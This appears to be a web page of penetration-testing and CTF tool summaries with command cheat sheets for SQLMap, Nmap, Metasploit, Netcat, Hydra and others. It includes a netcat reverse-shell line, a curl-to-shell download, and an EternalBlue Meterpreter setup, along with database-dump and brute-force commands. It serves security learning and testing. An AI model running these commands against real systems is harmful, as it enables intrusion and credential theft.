Web Application Testing 7 tools
Burp Suite
WEB PAID/FREE

The industry-standard web application security testing platform. Acts as a man-in-the-middle proxy to intercept, inspect, and modify HTTP/S traffic. Includes a scanner, repeater, intruder, and decoder. Community edition is free; Pro unlocks automated scanning.

⌨ Quick Cheat Sheet
# Set browser proxy → 127.0.0.1:8080 # Intercept ON → modify request → Forward # Send to Repeater: Ctrl+R # Send to Intruder: Ctrl+I (fuzzing) # Decoder: Ctrl+Shift+D
portswigger.net
FREE TIER
SQLMap
CLI FREE

Automated SQL injection detection and exploitation tool. Supports MySQL, PostgreSQL, MSSQL, Oracle, and more. Can dump databases, bypass authentication, and even get a shell on vulnerable targets — all from a single command.

⌨ Basic Commands
sqlmap -u "http://target.com/?id=1" --dbs sqlmap -u "URL" -D dbname --tables sqlmap -u "URL" -D dbname -T users --dump sqlmap -u "URL" --forms --crawl=2 sqlmap -u "URL" --level=5 --risk=3
sqlmap.org
OPEN SOURCE
Nikto
CLI FREE

Open-source web server scanner that tests for over 6,700 potentially dangerous files and scripts. Checks for outdated server software, insecure HTTP headers, and common misconfigurations. Fast and easy to use for a quick surface-level audit.

⌨ Basic Commands
nikto -h http://target.com nikto -h target.com -p 443 -ssl nikto -h target.com -o report.html -Format htm nikto -h target.com -Tuning 1 # files only
github.com/sullo/nikto
OPEN SOURCE
Gobuster / FFUF
CLI FREE

Fast directory and file brute-forcers for finding hidden paths on web servers. Gobuster is reliable for directory enumeration; FFUF (Fuzz Faster U Fool) is more flexible with powerful filtering options. Both use wordlists to discover endpoints that aren't linked anywhere.

⌨ Basic Commands
gobuster dir -u http://target.com -w wordlist.txt gobuster dns -d target.com -w subdomains.txt ffuf -u http://target.com/FUZZ -w list.txt ffuf -u http://target.com/FUZZ -w list.txt \ -mc 200,301 -fs 1234
github.com/ffuf/ffuf
OPEN SOURCE
OWASP ZAP
GUI FREE

OWASP's free and open-source web security scanner. Great alternative to Burp Suite Community. Features an intercepting proxy, active/passive scanning, spider, and fuzzer. Excellent for beginners learning web security fundamentals with a full GUI.

⌨ CLI Mode
zap-cli quick-scan -s xss,sqli http://target.com zap-cli spider http://target.com zap-cli active-scan http://target.com zap-cli report -o report.html -f html
zaproxy.org
OPEN SOURCE
Exploit-DB + Searchsploit
WEB CLI FREE

The world's largest public exploit database, maintained by Offensive Security. Search CVEs and PoC code directly from the browser. Searchsploit is the offline CLI version pre-installed on Kali Linux — search without internet, copy exploit templates locally.

⌨ Searchsploit Commands
searchsploit apache 2.4 searchsploit -t wordpress 5.8 # title-only searchsploit -m 12345 # copy exploit searchsploit --cve CVE-2021-41773 searchsploit -u # update db
exploit-db.com
FREE
Wappalyzer / WhatWeb
WEB CLI FREE

Technology fingerprinting tools that identify what a website is built with — CMS, frameworks, server software, libraries, and more. Wappalyzer is a browser extension for real-time detection; WhatWeb is the powerful CLI equivalent for in-depth enumeration.

⌨ WhatWeb Commands
whatweb http://target.com whatweb -a 3 http://target.com # aggression lvl whatweb -v http://target.com # verbose output whatweb --log-json=out.json target.com
wappalyzer.com

AI WEB

⌨ Security Prompts
"Review this PHP code for SQLi: [code]" "Explain CVE-2024-XXXX in simple terms." "What does this Base64 decode to?" "Write a Python script to parse this Nmap XML output."

FREE TIER
Nuclei
CLI FREE

Community-driven vulnerability scanner using YAML templates. Thousands of templates detect CVEs, misconfigurations, exposed panels, and default credentials. ProjectDiscovery's AI system auto-generates new templates from vulnerability write-ups — a bridge between AI and scanning.

⌨ Basic Commands
nuclei -u https://target.com nuclei -u https://target.com -t cves/ nuclei -l targets.txt -t exposures/ nuclei -u target.com -severity critical,high nuclei -update-templates

Information Gathering / OSINT 6 tools
Nmap
CLI FREE

The gold standard for network reconnaissance. Discovers live hosts, open ports, running services and their versions, and operating systems. The Nmap Scripting Engine (NSE) extends it with vulnerability detection, brute-forcing, and service enumeration scripts.

⌨ Essential Commands
nmap -sV -sC -O 192.168.1.1 # full scan nmap -p- --min-rate 5000 target # all ports nmap -sU -p 53,161 target # UDP scan nmap --script vuln target # vuln scripts nmap -A -T4 target -oN output.txt # aggressive
nmap.org
OPEN SOURCE
Shodan
WEB PAID/FREE

The "search engine for the internet of things." Shodan continuously scans the entire internet and indexes exposed devices — servers, cameras, routers, industrial systems. Use it to discover an organization's internet-facing attack surface without sending a single packet.

⌨ Search Dorks
org:"Company Name" # by org port:22 country:TH # SSH in Thailand product:"Apache httpd" vuln:CVE-X # vuln check hostname:target.com "default password" port:80
shodan.io
FREE TIER
theHarvester
CLI FREE

OSINT tool for gathering email addresses, subdomains, employee names, and IP information from public sources. Aggregates data from Google, Bing, LinkedIn, Shodan, Hunter.io, and many more. Essential for the initial passive reconnaissance phase.

⌨ Basic Commands
theHarvester -d target.com -b google theHarvester -d target.com -b all theHarvester -d target.com -b linkedin theHarvester -d target.com -b shodan \ -l 500 -f output.html
github: theHarvester
OPEN SOURCE
Maltego
GUI PAID/FREE

Powerful OSINT and graphical link-analysis tool. Visualizes relationships between people, companies, domains, IPs, and social media accounts as an interactive graph. Uses "transforms" to automate data collection from dozens of sources. Community edition is free.

⌨ Workflow Steps
# 1. Add entity (Domain / Person / Email) # 2. Right-click → Run Transforms # 3. Select: "DNS to IP", "Email to Person" # 4. Expand graph iteratively # 5. Export graph as PDF/image
maltego.com
FREE TIER
Whois / DNSRecon
CLI FREE

Foundational passive recon tools. whois retrieves domain registration details — registrant, registrar, name servers. DNSRecon performs comprehensive DNS enumeration: zone transfers, brute-forcing subdomains, and mapping all DNS records.

⌨ Commands
whois target.com dnsrecon -d target.com -t std dnsrecon -d target.com -t axfr # zone transfer dnsrecon -d target.com -D list.txt -t brt dig target.com ANY +noall +answer
github: dnsrecon
OPEN SOURCE
Recon-ng
CLI FREE

A full-featured web reconnaissance framework similar to Metasploit in structure. Uses a workspace and module system to collect OSINT from APIs, DNS, search engines, and breach databases. Results are stored in a built-in database for structured reporting.

⌨ Basic Workflow
recon-ng > workspaces create target > marketplace search hackertarget > marketplace install hackertarget/... > modules load hackertarget/... > options set SOURCE target.com > run
github: recon-ng

CTF & Wargames Tools 6 tools
CyberChef
WEB FREE

The Cyber Swiss Army Knife — a browser-based app for encoding, decoding, encrypting, and analyzing data. Drag-and-drop "recipes" chain 300+ operations like Base64, XOR, AES, ROT13, hex, magic detection, regex, and hashing. Essential for CTF crypto and forensics.

⌨ Common Recipes
From Base64 → To Text From Hex → To Text XOR Brute Force (key: 1-50) Magic (auto-detect encoding) ROT13 → From Base64 → Gunzip
gchq.github.io/CyberChef
BROWSER TOOL
Ghidra
GUI FREE

NSA's open-source reverse engineering suite. Disassembles and decompiles binaries back into readable C-like pseudocode. Supports x86, ARM, MIPS, and more. The go-to free tool for CTF reverse engineering challenges and malware analysis. Comparable to IDA Pro.

⌨ Key Shortcuts
G → Go to address Ctrl+F → Search strings/functions L → Rename variable/function Ctrl+L → Search labels Decompile window → Read pseudo-C Script Manager → Automate analysis
ghidra-sre.org
OPEN SOURCE
pwntools + pwndbg
CLI FREE

The essential toolkit for binary exploitation CTFs. pwntools is a Python library for writing exploit scripts — handling shellcode, ROP chains, format strings, and remote connections. pwndbg is a GDB plugin that adds heap visualization, paging, and exploit-aware commands.

⌨ pwntools Basics
from pwn import * p = process('./binary') # local p = remote('host', 1337) # remote payload = b'A'*40 + p64(0xdeadbeef) p.sendline(payload) p.interactive() # get shell
docs.pwntools.com
OPEN SOURCE
Steghide / Stegsolve
CLI FREE

Steganography tools for finding hidden data in images and audio files — a staple of CTF challenges. Steghide embeds/extracts data from JPEGs and MP3s. Stegsolve is a Java GUI that applies bit-plane filters and color analyses to reveal hidden messages in images.

⌨ Commands
steghide extract -sf image.jpg steghide extract -sf img.jpg -p "" # no pass binwalk -e file.jpg # extract files strings file.jpg | grep flag java -jar Stegsolve.jar # GUI analysis
steghide.sourceforge.net
FREE
Hashcat / John the Ripper
CLI FREE

Password cracking powerhouses. Hashcat uses GPU acceleration for blazing speed — billions of hashes per second. John the Ripper (JtR) is CPU-based with excellent format auto-detection. Both support dictionary, brute-force, and rule-based attacks. Crucial for CTF crypto and forensic challenges.

⌨ Key Commands
hashcat -m 0 hash.txt rockyou.txt # MD5 hashcat -m 1800 hash.txt rockyou.txt # sha512 hashcat -a 3 hash.txt ?a?a?a?a?a # brute john hash.txt --wordlist=rockyou.txt john --show hash.txt
hashcat.net
OPEN SOURCE
Wireshark
GUI FREE

The world's most popular network protocol analyzer. Captures and interactively browses live network traffic or opens .pcap files. In CTFs, pcap forensics challenges often hide flags inside DNS queries, HTTP responses, or custom protocols — Wireshark is the first tool you reach for.

⌨ Key Filters
http # HTTP only tcp.port == 4444 # specific port ip.addr == 10.0.0.1 # filter IP dns.qry.name contains "flag" frame contains "CTF{" # find flag string Follow → TCP Stream # read conversation
wireshark.org
OPEN SOURCE

Network & Exploitation 4 tools
Metasploit Framework
CLI FREE

The world's most widely used penetration testing framework with over 2,000 exploits. Find a vulnerability → pick a module → set options → get a Meterpreter shell. Post-exploitation features include privilege escalation, pivoting, credential dumping, and persistence.

⌨ Essential msfconsole
msfconsole > search eternalblue > use exploit/windows/smb/ms17_010_eternalblue > set RHOSTS 192.168.1.x > set PAYLOAD windows/x64/meterpreter/reverse_tcp > set LHOST 192.168.1.y > run
metasploit.com
OPEN SOURCE
Netcat (nc)
CLI FREE

The "TCP/IP Swiss Army Knife" — reads and writes raw TCP/UDP connections. Used to set up reverse shell listeners, transfer files, port scan, create backdoors, and even chat. An absolute fundamental for both CTF challenges and real pentesting. Built-in on most Unix systems.

⌨ Common Usage
nc -lvnp 4444 # listener nc target.com 4444 # connect nc -e /bin/bash ip 4444 # reverse shell nc ip 4444 < file.txt # file send nc -lvnp 4444 > recv.txt # file receive
nmap.org/ncat
BUILT-IN
Hydra
CLI FREE

Fast, parallelized login cracker supporting 50+ protocols: SSH, FTP, HTTP, RDP, SMB, SMTP, Telnet, and more. Used to test whether accounts are protected by weak or default credentials. Critical for network pentests and CTF challenges involving service authentication.

⌨ Common Commands
hydra -l admin -P passlist.txt ssh://target hydra -L users.txt -P pass.txt ftp://target hydra -l admin -P list.txt target http-post-form \ "/login:user=^USER^&pass=^PASS^:F=failed" hydra -t 4 -l root -P list.txt target ssh
github: thc-hydra
OPEN SOURCE
LinPEAS / WinPEAS
CLI FREE

Privilege Escalation Awesome Scripts — automatically enumerate hundreds of potential privilege escalation vectors after you've gained a foothold. LinPEAS covers Linux (SUID, cron, sudo, weak permissions); WinPEAS covers Windows (services, registry, credentials, tokens). Color-coded output highlights critical findings.

⌨ Quick Deployment
# Linux: download and run curl -L https://github.com/.../linpeas.sh | sh # or upload then: chmod +x linpeas.sh && ./linpeas.sh # Windows: .\winPEASany.exe quiet .\winPEASany.exe systeminfo
github: PEASS-ng
